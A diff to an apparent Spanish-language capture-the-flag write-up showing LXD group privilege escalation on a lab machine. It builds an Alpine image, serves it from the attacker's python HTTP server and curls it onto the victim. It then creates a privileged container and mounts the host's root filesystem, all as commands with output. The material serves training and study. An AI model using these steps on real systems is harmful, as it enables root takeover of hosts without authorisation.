@@ -223,10 +223,103 @@ Linux Container Daemon (LXD), es una herramienta de gestión de los contenedores
     Utilizamos el metodo 2.
     INFO: https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation
 
-  1)Nos
+  1)Creamos la imagen para sistema de 32bits, este proceso se realiza en nuesta maquina de atacante.
 
+    - Descargamos la imagen
+  
+            ┌──(root㉿kali)-[/home/…/Desktop/ctf/gamingserver/lxd]
+            └─# git clone https://github.com/saghul/lxd-alpine-builder
+            Cloning into 'lxd-alpine-builder'...
+            remote: Enumerating objects: 50, done.
+            remote: Counting objects: 100% (8/8), done.
+            remote: Compressing objects: 100% (6/6), done.
+            Receiving objects: 100% (50/50), 3.11 MiB | 2.92 MiB/s, done.
+            remote: Total 50 (delta 2), reused 5 (delta 2), pack-reused 42
+            Resolving deltas: 100% (15/15), done.
+                                                                                                                                                                                          
+            ┌──(root㉿kali)-[/home/…/Desktop/ctf/gamingserver/lxd]
+            └─# cd lxd-alpine-builder
+      
+    - Reemplazamos con sed dicho contenido creando un fichero llamado build-alpine
+                                                                       
+          ┌──(root㉿kali)-[/home/…/ctf/gamingserver/lxd/lxd-alpine-builder]
+          └─# sed -i 's,yaml_path="latest-stable/releases/$apk_arch/latest-releases.yaml",yaml_path="v3.8/releases/$apk_arch/latest-releases.yaml",' build-alpine                                    
+ 
+    -   Creamos la imagen para sistemas con arquitectura de 32 bits.
+                                                                                                                                           
+            ┌──(root㉿kali)-[/home/…/ctf/gamingserver/lxd/lxd-alpine-builder]
+            └─# ./build-alpine -a i686
+            Determining the latest release... v3.8
+            [...]
+            tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
+            alpine-devel@lists.alpinelinux.org-4a6a0840.rsa.pub: OK
+            Verified OK
+              % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                             Dload  Upload   Total   Spent    Left  Speed
+            100  2695  100  2695    0     0   1891      0  0:00:01  0:00:01 --:--:--  1892
+            --2023-08-16 09:49:21--  http://alpine.mirror.wearetriple.com/MIRRORS.txt
+            Resolving alpine.mirror.wearetriple.com (alpine.mirror.wearetriple.com)... 93.187.10.106, 2a00:1f00:dc06:10::106
+            Connecting to alpine.mirror.wearetriple.com (alpine.mirror.wearetriple.com)|93.187.10.106|:80... connected.
+            HTTP request sent, awaiting response... 200 OK
+            Length: 2695 (2.6K) [text/plain]
+            Saving to: ‘/home/kali/Desktop/ctf/gamingserver/lxd/lxd-alpine-builder/rootfs/usr/share/alpine-mirrors/MIRRORS.txt’
+            
+            /home/kali/Desktop/ctf/gamingserver/lxd/lxd 100%[=========================================================================================>]   2.63K  --.-KB/s    in 0s      
+            
+            2023-08-16 09:49:21 (308 MB/s) - ‘/home/kali/Desktop/ctf/gamingserver/lxd/lxd-alpine-builder/rootfs/usr/share/alpine-mirrors/MIRRORS.txt’ saved [2695/2695]
+            [...]
+        
+  2)Importamos imagen a la maquina victima y la explotamos
+
+    - Montamos un servidor http mediante python en nuestro equipo y nos descargamos la imagen desde la maquina victima.
+
+            ┌──(root㉿kali)-[/home/…/ctf/gamingserver/lxd/lxd-alpine-builder]
+            └─# python3 -m http.server 80
+            Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+
+            john@exploitable:~$ curl http://10.9.92.151/alpine-v3.8-i686-20230816_0949.tar.gz -o /tmp/alpine.tar.gz
+              % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                             Dload  Upload   Total   Spent    Left  Speed
+            100 2601k  100 2601k    0     0  1624k      0  0:00:01  0:00:01 --:--:-- 1623k
+      
+            john@exploitable:~$ cd /tmp
+      
+            john@exploitable:/tmp$ ls -la
+            total 2644
+            drwxrwxrwt 10 root root    4096 Aug 16 08:17 .
+            drwxr-xr-x 24 root root    4096 Feb  5  2020 ..
+            -rw-rw-r--  1 john john 2663971 Aug 16 08:17 alpine.tar.gz
+
+    - Importamos la imagen en la maquina victima.
+
+            john@exploitable:/tmp$ lxc image import ./alpine.tar.gz --alias myimage
+                Image imported with fingerprint: 4e09783983071fe2ad1eec7150448f116ca2cecb02df307905fd5cd35ea3f6e0
+
+    - Establecemos las configuraciones necesarias basicas para poder correr nuesto contenedor
+ 
+            john@exploitable:/tmp$ lxd init
+            Would you like to use LXD clustering? (yes/no) [default=no]: no
+            Do you want to configure a new storage pool? (yes/no) [default=yes]: no
+            Would you like to connect to a MAAS server? (yes/no) [default=no]: no
+            Would you like to create a new local network bridge? (yes/no) [default=yes]: no
+            Would you like to configure LXD to use an existing bridge or host interface? (yes/no) [default=no]: no
+            Would you like LXD to be available over the network? (yes/no) [default=no]: no
+            Would you like stale cached images to be updated automatically? (yes/no) [default=yes] no
+            Would you like a YAML "lxd init" preseed to be printed? (yes/no) [default=no]: no
+      
+    - Corremos el contenedor
+      
+            john@exploitable:/tmp$ lxc init myimage mycontainer -c security.privileged=true
+            Creating mycontainer
+      
+    INFO: security.privilege=true crea un contenedor privilegiado que establece que el usuario root dentro del contenedor sea el mismo que el usuario root en el sistema host.
+  
     
-                                                                   
+  - Montamos el sistema raiz del host en la carpeta /mnt/root de nuestro contenedor.
+
+        john@exploitable:/tmp$ lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true
+        Device mydevice added to mycontainer
+
 
         
 
